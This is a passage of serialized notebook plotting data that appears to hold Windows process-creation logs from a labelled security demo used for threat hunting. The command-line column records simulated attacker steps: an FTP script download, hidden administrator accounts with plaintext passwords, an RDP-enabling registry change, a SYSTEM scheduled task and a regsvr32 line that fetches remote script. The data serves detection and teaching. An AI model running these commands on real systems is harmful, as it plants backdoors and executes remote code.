gDguDq6MndCAFC6Oroyd0IAwLo6ujJ3QgAwvDq6MndCABBHProyd0IAUEg+ujJ3QgBgST66MndCAIBWProyd0IAMFg+ujJ3QgAQUwu4MndCALBZC7gyd0IA0DsDuDJ3QgAQXAO4MndCAJBwBLgyd0I=\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[124]},\"TimeGenerated_orig_par\":[\"NaN\",0.0,0.0,0.0,1594162707843.0,1594162707843.0,0.0,0.0,0.0,1594163252387.0,1594163252387.0,1594163252387.0,1594163252387.0,1594163252387.0,1594163252387.0,1594163252387.0,1594163252387.0,1594163253103.0,1594163252387.0,1594163252387.0,1594163253297.0,1594163252387.0,1594163253427.0,1594163252387.0,1594163253520.0,1594163252387.0,1594163252387.0,1594163253567.0,1594163252387.0,1594163253637.0,1594163252387.0,1594163252387.0,1594163253683.0,1594163252387.0,1594163253807.0,1594163252387.0,1594163253893.0,1594163252387.0,1594163252387.0,1594163252387.0,0.0,1594163261087.0,1594163261087.0,1594163261087.0,1594163261087.0,1594163261087.0,1594163261087.0,1594163261087.0,1594163261087.0,1594163277093.0,1594163261087.0,1594163261087.0,1594163277129.9998,1594163261087.0,1594163277160.0,1594163261087.0,1594163261087.0,1594163277237.0,1594163261087.0,1594163277267.0,1594163261087.0,1594163261087.0,1594163277307.0,1594163261087.0,1594163277340.0,1594163261087.0,1594163277413.0,1594163261087.0,1594163261087.0,1594163261087.0,1594163261087.0,1594163377853.0,1594163261087.0,1594163377903.0,1594163261087.0,1594163377937.0,1594163261087.0,1594163261087.0,1594163261087.0,1594163261087.0,1594163261087.0,1594163261087.0,1594163261087.0,1594163261087.0,1594164912840.0,1594163261087.0,1594163261087.0,1594164912870.0002,1594163261087.0,1594164912963.0,1594163261087.0,1594164913033.0,1594163261087.0,1594163261087.0,1594164913063.0,1594163261087.0,1594164913107.0,1594163261087.0,1594163261087.0,1594164913137.0,1594163261087.0,1594164913213.0,1594163261087.0,1594164913293.0,1594163261087.0,1594163261087.0,1594163261087.0,1594163261087.0,1594165013333.0,1594163261087.0,1594165013383.0,1594163261087.0,1594165013413.0,1594163261087.0,1594163261087.0,1594163261087.0,1594163261087.0,1594163261087.0,1594163261087.0,0.0,1594162722097.0,0.0,1594162688957.0,1594162688957.0],\"TokenElevationType\":[\"NaN\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\",\"%%1936\"],\"cmd\":[\"cmdline unknown\",\"\\\"C:\\\\Program Files (x86)\\\\Notepad++\\\\notepad++.exe\\\"  \\\"C:\\\\Users\\\\mstic_admin\\\\Documents\\\\tools...\",\"\\\"C:\\\\Program Files (x86)\\\\Notepad++\\\\notepad++.exe\\\"  \\\"C:\\\\Users\\\\mstic_admin\\\\Documents\\\\tools...\",\"\\\"C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\\\" C:\\\\Users\\\\mstic_admin\\\\Documents\\\\tools\\\\...\",\"\\\"C:\\\\Program Files (x86)\\\\Internet Explorer\\\\IEXPLORE.EXE\\\" SCODEF:8428 CREDAT:17410 /prefe...\",\"\\\"C:\\\\Program Files (x86)\\\\Internet Explorer\\\\IEXPLORE.EXE\\\" SCODEF:8428 CREDAT:82946 /prefe...\",\"\\\"C:\\\\Program Files (x86)\\\\Notepad++\\\\notepad++.exe\\\"  \\\"C:\\\\Users\\\\mstic_admin\\\\Documents\\\\tools...\",\"\\\"C:\\\\Program Files (x86)\\\\Notepad++\\\\notepad++.exe\\\"  \\\"C:\\\\Users\\\\mstic_admin\\\\Documents\\\\tools...\",\"C:\\\\windows\\\\system32\\\\cmd.exe /c \\\"\\\"C:\\\\Users\\\\mstic_admin\\\\Documents\\\\tools\\\\SimulateAttack.cm...\",\"\\\\??\\\\C:\\\\windows\\\\system32\\\\conhost.exe 0xffffffff -ForceV1\",\"cmd  /c echo Begin Security Demo tasks\",\"cmd  /c echo Any questions about the commands executed here then please contact one of\",\"cmd  /c echo timb@microsoft.com; ianhelle@microsoft.com; shainw@microsoft.com\",\"cmd  /c echo open ftp.wh401k.org \",\"ftp  -s:MG06.dll\",\"cacls.exe  C:\\\\Windows\\\\system32\\\\cscript.exe /e /t /g SYSTEM:F\",\"net  users \",\"C:\\\\windows\\\\system32\\\\net1  users \",\"findstr  \\\"abai$\\\"\",\"net  user abai$ Wf9k44_9d[=$ /add\",\"C:\\\\windows\\\\system32\\\\net1  user abai$ Wf9k44_9d[=$ /add\",\"net  user abai$ Wf9k44_9d[=$\",\"C:\\\\windows\\\\system32\\\\net1  user abai$ Wf9k44_9d[=$\",\"net  localgroup administrators \",\"C:\\\\windows\\\\system32\\\\net1  localgroup administrators \",\"findstr  \\\"abai$\\\"\",\"net  localgroup administrators abai$ /add\",\"C:\\\\windows\\\\system32\\\\net1  localgroup administrators abai$ /add\",\"net  users \",\"C:\\\\windows\\\\system32\\\\net1  users \",\"findstr  \\\"www.401hk.com\\\"\",\"net  user www.401hk.com Wf9k44_9d[=$ /add\",\"C:\\\\windows\\\\system32\\\\net1  user www.401hk.com Wf9k44_9d[=$ /add\",\"net  user www.401hk.com Wf9k44_sinc9d3[=$\",\"C:\\\\windows\\\\system32\\\\net1  user www.401hk.com Wf9k44_sinc9d3[=$\",\"net  user www.401hk.com /active:yes\",\"C:\\\\windows\\\\system32\\\\net1  user www.401hk.com /active:yes\",\"reg  ADD \\\"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\" /v fDenyTSConnections ...\",\"schtasks.exe  /create /tn  /tr \\\"c:\\\\pagefile.exe /?\\\" /sc hour /mo 1 /ru \\\"system\\\" /f\",\"ping  127.0.0.1 -n 100 \",\"\\\"C:\\\\windows\\\\system32\\\\cmd.exe\\\" \",\"\\\\??\\\\C:\\\\windows\\\\system32\\\\conhost.exe 0xffffffff -ForceV1\",\"cmd  /c echo Begin Security Demo tasks\",\"cmd  /c echo Any questions about the commands executed here then please contact one of\",\"cmd  /c echo timb@microsoft.com; ianhelle@microsoft.com; shainw@microsoft.com\",\"cmd  /c echo open ftp.wh401k.org \",\"ftp  -s:MG06.dll\",\"cacls.exe  C:\\\\Windows\\\\system32\\\\cscript.exe /e /t /g SYSTEM:F\",\"net  users \",\"C:\\\\windows\\\\system32\\\\net1  users \",\"findstr  \\\"abai$\\\"\",\"net  user abai$ Wf9k44_9d[=$ /add\",\"C:\\\\windows\\\\system32\\\\net1  user abai$ Wf9k44_9d[=$ /add\",\"net  user abai$ Wf9k44_9d[=$\",\"C:\\\\windows\\\\system32\\\\net1  user abai$ Wf9k44_9d[=$\",\"findstr  \\\"abai$\\\"\",\"net  localgroup administrators \",\"C:\\\\windows\\\\system32\\\\net1  localgroup administrators \",\"net  localgroup administrators abai$ /add\",\"C:\\\\windows\\\\system32\\\\net1  localgroup administrators abai$ /add\",\"findstr  \\\"www.401hk.com\\\"\",\"net  users \",\"C:\\\\windows\\\\system32\\\\net1  users \",\"net  user www.401hk.com Wf9k44_sinc9d3[=$\",\"C:\\\\windows\\\\system32\\\\net1  user www.401hk.com Wf9k44_sinc9d3[=$\",\"net  user www.401hk.com /active:yes\",\"C:\\\\windows\\\\system32\\\\net1  user www.401hk.com /active:yes\",\"reg  ADD \\\"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\" /v fDenyTSConnections ...\",\"schtasks.exe  /create /tn  /tr \\\"c:\\\\pagefile.exe /?\\\" /sc hour /mo 1 /ru \\\"system\\\" /f\",\"ping  127.0.0.1 -n 100 \",\"net  localgroup administrators abai$ /delete\",\"C:\\\\windows\\\\system32\\\\net1  localgroup administrators abai$ /delete\",\"net  user abai$ /delete\",\"C:\\\\windows\\\\system32\\\\net1  user abai$ /delete\",\"net  user www.401hk.com /delete\",\"C:\\\\windows\\\\system32\\\\net1  user www.401hk.com /delete\",\"cmd  /c echo End Security Demo tasks\",\"cmd  /c echo Begin Security Demo tasks\",\"cmd  /c echo Any questions about the commands executed here then please contact one of\",\"cmd  /c echo timb@microsoft.com; ianhelle@microsoft.com; shainw@microsoft.com\",\"cmd  /c echo open ftp.wh401k.org \",\"ftp  -s:MG06.dll\",\"cacls.exe  C:\\\\Windows\\\\system32\\\\cscript.exe /e /t /g SYSTEM:F\",\"net  users \",\"C:\\\\windows\\\\system32\\\\net1  users \",\"findstr  \\\"abai$\\\"\",\"net  user abai$ Wf9k44_9d[=$ /add\",\"C:\\\\windows\\\\system32\\\\net1  user abai$ Wf9k44_9d[=$ /add\",\"net  user abai$ Wf9k44_9d[=$\",\"C:\\\\windows\\\\system32\\\\net1  user abai$ Wf9k44_9d[=$\",\"net  localgroup administrators \",\"C:\\\\windows\\\\system32\\\\net1  localgroup administrators \",\"findstr  \\\"abai$\\\"\",\"net  localgroup administrators abai$ /add\",\"C:\\\\windows\\\\system32\\\\net1  localgroup administrators abai$ /add\",\"net  users \",\"C:\\\\windows\\\\system32\\\\net1  users \",\"findstr  \\\"www.401hk.com\\\"\",\"net  user www.401hk.com Wf9k44_9d[=$ /add\",\"C:\\\\windows\\\\system32\\\\net1  user www.401hk.com Wf9k44_9d[=$ /add\",\"net  user www.401hk.com Wf9k44_sinc9d3[=$\",\"C:\\\\windows\\\\system32\\\\net1  user www.401hk.com Wf9k44_sinc9d3[=$\",\"net  user www.401hk.com /active:yes\",\"C:\\\\windows\\\\system32\\\\net1  user www.401hk.com /active:yes\",\"reg  ADD \\\"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\" /v fDenyTSConnections ...\",\"schtasks.exe  /create /tn  /tr \\\"c:\\\\pagefile.exe /?\\\" /sc hour /mo 1 /ru \\\"system\\\" /f\",\"ping  127.0.0.1 -n 100 \",\"net  localgroup administrators abai$ /delete\",\"C:\\\\windows\\\\system32\\\\net1  localgroup administrators abai$ /delete\",\"net  user abai$ /delete\",\"C:\\\\windows\\\\system32\\\\net1  user abai$ /delete\",\"net  user www.401hk.com /delete\",\"C:\\\\windows\\\\system32\\\\net1  user www.401hk.com /delete\",\"cmd  /c echo End Security Demo tasks\",\"cmd  /c echo Begin Security Demo tasks\",\"cmd  /c echo Any questions about the commands executed here then please contact one of\",\"cmd  /c echo timb@microsoft.com; ianhelle@microsoft.com; shainw@microsoft.com\",\".\\\\regsvr32   /s /n /u /i:http://server/file.sct scrobj.dll\",\"cmd  /c echo End Security Demo tasks\",\"\\\"C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\\\" C:\\\\Users\\\\mstic_admin\\\\Documents\\\\tools\\\\...\",\"\\\"C:\\\\Program Files (x86)\\\\Internet Explorer\\\\IEXPLORE.EXE\\\" SCODEF:6444 CREDAT:17410 /prefe...\",\"\\\"C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\\\" C:\\\\Users\\\\mstic_admin\\\\Documents\\\\tools\\\\...\",\"\\\"C:\\\\Program Files (x86)\\\\Internet Explorer\\\\IEXPLORE.EXE\\\" SCODEF:3760 CREDAT:17410 /prefe...\",\"\\\"C:\\\\Program Files (x86)\\\\Internet Explorer\\\\IEXPLORE.EXE\\\" SCODEF:3760 CREDAT:82946 /prefe...\"],\"index\":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123],\"new_process_lc\":[\"c:\\\\windows\\\\explorer.exe\",\"c:\\\\program files (x86)\\\\notepad++\\\\notepad++.exe\",\"c:\\\\program files (x86)\\\\notepad++\\\\notepad++.exe\",\"c:\\\\program files\\\\internet explorer\\\\iexplore.exe\",\"c:\\\\program files (x86)\\\\internet explorer\\\\iexplore.exe\",\"c:\\\\program files (x86)\\\\internet explorer\\\\iexplore.exe\",\"c:\\\\program files (x86)\\\\notepad++\\\\notepad++.exe\",\"c:\\\\program files (x86)\\\\notepad++\\\\notepad++.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\conhost.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\ftp.exe\",\"c:\\\\windows\\\\system32\\\\cacls.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\findstr.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\findstr.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\findstr.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\reg.exe\",\"c:\\\\windows\\\\system32\\\\schtasks.exe\",\"c:\\\\windows\\\\system32\\\\ping.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\conhost.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\ftp.exe\",\"c:\\\\windows\\\\system32\\\\cacls.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\findstr.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\findstr.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\findstr.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\reg.exe\",\"c:\\\\windows\\\\system32\\\\schtasks.exe\",\"c:\\\\windows\\\\system32\\\\ping.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\ftp.exe\",\"c:\\\\windows\\\\system32\\\\cacls.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\findstr.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\findstr.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\findstr.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\reg.exe\",\"c:\\\\windows\\\\system32\\\\schtasks.exe\",\"c:\\\\windows\\\\system32\\\\ping.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\net1.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\w!ndows\\\\system32\\\\regsvr32.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\program files\\\\internet explorer\\\\iexplore.exe\",\"c:\\\\program files (x86)\\\\internet explorer\\\\iexplore.exe\",\"c:\\\\program files\\\\internet explorer\\\\iexplore.exe\",\"c:\\\\program files (x86)\\\\internet explorer\\\\iexplore.exe\",\"c:\\\\program files (x86)\\\\internet explorer\\\\iexplore.exe\"],\"new_process_lc_par\":[\"NaN\",\"c:\\\\windows\\\\explorer.exe\",\"c:\\\\windows\\\\explorer.exe\",\"c:\\\\windows\\\\explorer.exe\",\"c:\\\\program files\\\\internet explorer\\\\iexplore.exe\",\"c:\\\\program files\\\\internet explorer\\\\iexplore.exe\",\"c:\\\\windows\\\\explorer.exe\",\"c:\\\\windows\\\\explorer.exe\",\"c:\\\\windows\\\\explorer.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\explorer.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\explorer.exe\",\"c:\\\\program files\\\\internet explorer\\\\iexplore.exe\",\"c:\\\\windows\\\\explorer.exe\",\"c:\\\\program files\\\\internet explorer\\\\iexplore.exe\",\"c:\\\\program files\\\\internet explorer\\\\iexplore.exe\"],\"parent_index\":[\"NaN\",\"660\",\"660\",\"660\",\"11\",\"11\",\"660\",\"660\",\"660\",\"112\",\"112\",\"112\",\"112\",\"112\",\"112\",\"112\",\"112\",\"121\",\"112\",\"112\",\"124\",\"112\",\"126\",\"112\",\"128\",\"112\",\"112\",\"131\",\"112\",\"133\",\"112\",\"112\",\"136\",\"112\",\"138\",\"112\",\"140\",\"112\",\"112\",\"112\",\"660\",\"145\",\"145\",\"145\",\"145\",\"145\",\"145\",\"145\",\"145\",\"154\",\"145\",\"145\",\"157\",\"145\",\"159\",\"145\",\"145\",\"162\",\"145\",\"164\",\"145\",\"145\",\"167\",\"145\",\"169\",\"145\",\"171\",\"145\",\"145\",\"145\",\"145\",\"178\",\"145\",\"180\",\"145\",\"182\",\"145\",\"145\",\"145\",\"145\",\"145\",\"145\",\"145\",\"145\",\"250\",\"145\",\"145\",\"253\",\"145\",\"255\",\"145\",\"257\",\"145\",\"145\",\"260\",\"145\",\"262\",\"145\",\"145\",\"265\",\"145\",\"267\",\"145\",\"269\",\"145\",\"145\",\"145\",\"145\",\"276\",\"145\",\"278\",\"145\",\"280\",\"145\",\"145\",\"145\",\"145\",\"145\",\"145\",\"660\",\"20\",\"660\",\"6\",\"6\"],\"parent_key\":[\"NaN\",\"c:\\\\windows\\\\explorer.exe0x167c1970-01-01 00:00:00.000000\",\"c:\\\\windows\\\\explorer.exe0x167c1970-01-01 00:00:00.000000\",\"c:\\\\windows\\\\explorer.exe0x167c1970-01-01 00:00:00.000000\",\"c:\\\\program files\\\\internet explorer\\\\iexplore.exe0x20ec2020-07-07 22:58:27.843000\",\"c:\\\\program files\\\\internet explorer\\\\iexplore.exe0x20ec2020-07-07 22:58:27.843000\",\"c:\\\\windows\\\\explorer.exe0x167c1970-01-01 00:00:00.000000\",\"c:\\\\windows\\\\explorer.exe0x167c1970-01-01 00:00:00.000000\",\"c:\\\\windows\\\\explorer.exe0x167c1970-01-01 00:00:00.000000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x26a82020-07-07 23:07:32.387000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x26a82020-07-07 23:07:32.387000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x26a82020-07-07 23:07:32.387000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x26a82020-07-07 23:07:32.387000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x26a82020-07-07 23:07:32.387000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x26a82020-07-07 23:07:32.387000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x26a82020-07-07 